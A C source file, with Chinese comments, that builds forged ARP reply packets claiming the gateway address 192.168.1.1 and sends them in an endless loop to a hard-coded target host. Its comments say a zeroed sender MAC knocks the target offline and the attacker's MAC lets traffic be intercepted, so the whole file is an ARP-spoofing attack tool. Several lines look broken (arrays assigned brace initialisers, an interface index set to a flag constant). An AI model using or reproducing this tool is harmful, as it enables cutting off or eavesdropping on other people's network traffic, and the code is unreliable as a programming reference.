//linux c arp協議分析二 - 打造並發送自己的arp包

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <net/ethernet.h>
#include <netpacket/packet.h>
#include <net/if.h>

//如果只是想讓對方斷網，那就把mac源都設成MAC_TRICK，
//想截獲數據包那就用MAC_SOURCE
#define MAC_TRICK {0x00, 0x00, 0x00, 0x00, 0x00, 0x00}
#define MAC_SOURCE {0x00, 0x0c, 0x29, 0xc7, 0x16, 0x33}
//冒充的IP
#define IP_TRICK "192.168.1.1"
//目的機器的MAC
#define MAC_TARGET {0x6c, 0x62, 0x6d, 0x3e, 0x8d, 0x60}
//目的機器的IP
#define IP_TARGET "192.168.1.64"

struct arp_packet
{
	//DLC Header
	//接收方mac
	unsigned char mac_target[ETH_ALEN];
	//發送方mac
	unsigned char mac_source[ETH_ALEN];
	//Ethertype - 0x0806是ARP幀的類型值
	unsigned short ethertype;

	//ARP Frame
	//硬體類型 - 乙太網類型值0x1
	unsigned short hw_type;
	//上層協定類型 - IP協定(0x0800)
	unsigned short proto_type;
	//MAC地址長度
	unsigned char mac_addr_len;
	//IP地址長度
	unsigned char ip_addr_len;
	//操作碼 - 0x1表示ARP請求包,0x2表示應答包
	unsigned short operation_code;
	//發送方mac
	unsigned char mac_sender[ETH_ALEN];
	//發送方ip
	unsigned char ip_sender[4];
	//接收方mac
	unsigned char mac_receiver[ETH_ALEN];
	//接收方ip
	unsigned char ip_receiver[4];
	//填充數據
	unsigned char padding[18];
};

void die(const char *pre);

int main(void)
{
	int sfd, len;
	struct arp_packet ap;
	struct in_addr inaddr_sender, inaddr_receiver;
	struct sockaddr_ll sl;

	sfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
	if(-1 == sfd)
	{
		perror("socket");
	}

	memset(&ap, 0, sizeof(arp_packet));
	ap.mac_target = MAC_TARGET;
	ap.mac_source = MAC_TRICK;
	ap.ethertype = htons(0x0806);
	ap.hw_type = htons(0x1);
	ap.proto_type = htons(0x0800);
	ap.mac_addr_len = ETH_ALEN;
	ap.ip_addr_len = 4;
	ap.operation_code = htons(0x2);
	ap.mac_sender = MAC_TRICK;
	inet_aton(IP_TRICK, &inaddr_sender);
	memcpy(&ap.ip_sender, &inaddr_sender, sizeof(inaddr_sender));
	ap.mac_receiver = MAC_TARGET;
	inet_aton(IP_TARGET, &inaddr_receiver);
	memcpy(&ap.ip_receiver, &inaddr_receiver, sizeof(inaddr_receiver));

	memset(&sl, 0, sizeof(sl));
	sl.sll_family = AF_PACKET;
	//sl.sll_addr = MAC_SOURCE;
	//sl.sll_halen = ETH_ALEN;
	sl.sll_ifindex = IFF_BROADCAST;//非常重要

	while(1)
	{
		len = sendto(sfd, &ap, sizeof(ap), 0, (struct sockaddr*)&sl, sizeof(sl));
		if(-1 == len)
		{
			die("sendto");
		}
	}

	return 0;
}

void die(const char *pre)
{
	perror(pre);
	exit(1);
}
